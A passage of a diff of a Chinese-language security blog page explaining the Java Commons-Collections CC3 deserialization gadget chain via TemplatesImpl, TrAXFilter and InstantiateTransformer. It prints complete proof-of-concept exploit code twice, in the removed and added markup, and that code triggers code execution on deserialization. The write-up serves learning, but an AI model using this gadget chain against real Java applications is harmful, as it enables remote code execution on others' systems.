obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Cal.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public class demo &#123;
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;
+        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    &#125;
+
+    public static void main(String[] args) throws Exception &#123;
+        TemplatesImpl obj &#x3D; new TemplatesImpl();
+        ClassPool pool &#x3D; ClassPool.getDefault();
+        CtClass clazz &#x3D; pool.get(Cal.class.getName());
+        byte[] code &#x3D; clazz.toBytecode();
+
+        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);
+        setFieldValue(obj, &quot;_name&quot;, &quot;Evil&quot;);
+        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        obj.newTransformer();
+    &#125;
+&#125;</code></pre>
 
 <p>结果弹出了计算器：</p>
 <img src="/Downloads/common33.png"  style="zoom:50%;" />
@@ -511,7 +665,31 @@
 <p>这里的setFieldValue方法是用来设置私有属性的，我们设置了三个属性：_bytecodes , _name ,  _tfactory。 _bytecodes是用来存放字节码的数组， _name可以是任意字符串，只要不为null即可。 _tfactory必须是一个TransformerFractoryImpl对象，因为在defineTransletClasses()中我们实例化TransletClassLoader对象的时候用到了它。</p>
 <h2 id="结合反序列化漏洞"><a href="#结合反序列化漏洞" class="headerlink" title="结合反序列化漏洞"></a>结合反序列化漏洞</h2><p>回顾我们上述说到的TemplatesImpl动态加载字节码来执行任意代码，触发方式其实就是调用TemplatesImpl的newTransform方法。结合之前的CommonCollections，我们貌似只需要将一个InvokerTransformer中的方法改成TemplatesImpl#newTransform并将ConstantTransformer返回的对象改成TemplatesImpl对象就可以了。</p>
 <p>说干就干：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Cal.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                code</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap,<span class="literal">null</span>,transformerChain);</span><br><span class="line"></span><br><span class="line">        outerMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">
+
+    public static void main(String[] args) throws Exception &#123;
+        TemplatesImpl obj &#x3D; new TemplatesImpl();
+        ClassPool pool &#x3D; ClassPool.getDefault();
+        CtClass clazz &#x3D; pool.get(Cal.class.getName());
+        byte[] code &#x3D; clazz.toBytecode();
+        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;
+                code
+        &#125;);
+        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
+        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        Transformer[] transformers &#x3D; new Transformer[]&#123;
+                new ConstantTransformer(obj),
+                new InvokerTransformer(&quot;newTransformer&quot;,null,null),
+        &#125;;
+        Transformer transformerChain &#x3D; new ChainedTransformer(transformers);
+
+        Map innerMap &#x3D; new HashMap();
+        Map outerMap &#x3D; TransformedMap.decorate(innerMap,null,transformerChain);
+
+        outerMap.put(&quot;key&quot;,&quot;value&quot;);
+    &#125;
+&#125;</code></pre>
 
 <p>结果成功返回计算器</p>
 <img src="/Downloads/common31.png"  style="zoom:50%;" />
@@ -521,15 +699,80 @@
 <img src="/Downloads/common32.png"  style="zoom:50%;" />
 
 <p>CommonCollections的目的就是为了突破这个限制。所以它并没有用到InvokerTransformer，而是用到了另一个com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">        TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">        _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">        _overrideDefaultParser = _transformer.overrideDefaultParser();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public TrAXFilter(Templates templates)  throws
+        TransformerConfigurationException
+    &#123;
+        _templates &#x3D; templates;
+        _transformer &#x3D; (TransformerImpl) templates.newTransformer();
+        _transformerHandler &#x3D; new TransformerHandlerImpl(_transformer);
+        _overrideDefaultParser &#x3D; _transformer.overrideDefaultParser();
+    &#125;</code></pre>
 
 <p>我们可以很清楚地看到这个类的构造函数中调用了我们需要的TemplatesImpl#newTransform方法。然而，没有了InvokerTransformer，这里的这个构造函数也是无法调用的，所以这里要用一个新的Transformer。org.apache.commons.collections.functors.InstantiateTransformer，这个Transformer的transformer方法可以调用其它类的构造函数。</p>
 <p>这里给出部分代码</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125;</span><br><span class="line">          ...</span><br><span class="line"> &#125;            </span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public Object transform(Object input) &#123;
+        try &#123;
+            if (!(input instanceof Class)) &#123;
+                throw new FunctorException(&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot; + (input &#x3D;&#x3D; null ? &quot;null object&quot; : input.getClass().getName()));
+            &#125; else &#123;
+                Constructor con &#x3D; ((Class)input).getConstructor(this.iParamTypes);
+                return con.newInstance(this.iArgs);
+            &#125;
+          ...
+ &#125;            </code></pre>
 
 <p>这个transformer方法可以调用它传进来的参数的构造函数，所以我们只需要让之前的ConstantTransformer给它返回一个TrAXFilter.class即可。同时我们还要把TrAXFilter构造函数的参数类型和参数通过InstantiateTransformer的构造函数传给这里的iParamTypes和iArgs。</p>
 <p>最后的POC：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Cal.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                code</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">exMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        exMap.put(tme,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;key&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(exMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">
+
+public class CommonCollections3 &#123;
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;
+        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    &#125;
+
+    public static void main(String[] args) throws Exception &#123;
+        TemplatesImpl obj &#x3D; new TemplatesImpl();
+        ClassPool pool &#x3D; ClassPool.getDefault();
+        CtClass clazz &#x3D; pool.get(Cal.class.getName());
+        byte[] code &#x3D; clazz.toBytecode();
+        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;
+                code
+        &#125;);
+        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
+        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        Transformer[] fakeTransformers &#x3D; new Transformer[] &#123;new ConstantTransformer(1)&#125;;
+        Transformer[] transformers &#x3D; new Transformer[]&#123;
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(
+                        new Class[] &#123; Templates.class &#125;,
+                        new Object[] &#123; obj &#125;)
+        &#125;;
+
+        Transformer transformerChain &#x3D; new ChainedTransformer(fakeTransformers);
+
+        Map innerMap &#x3D; new HashMap();
+        Map outerMap &#x3D; LazyMap.decorate(innerMap,transformerChain);
+
+        TiedMapEntry tme &#x3D; new TiedMapEntry(outerMap,&quot;key&quot;);
+        Map exMap &#x3D; new HashMap();
+        exMap.put(tme,&quot;value&quot;);
+
+        outerMap.remove(&quot;key&quot;);
+
+        setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);
+  
+        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();
+        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);
+        oos.writeObject(exMap);
+        oos.close();
+
+        ObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object o &#x3D; (Object) ois.readObject();
+    &#125;
+&#125;</code></pre>
 
 
                 
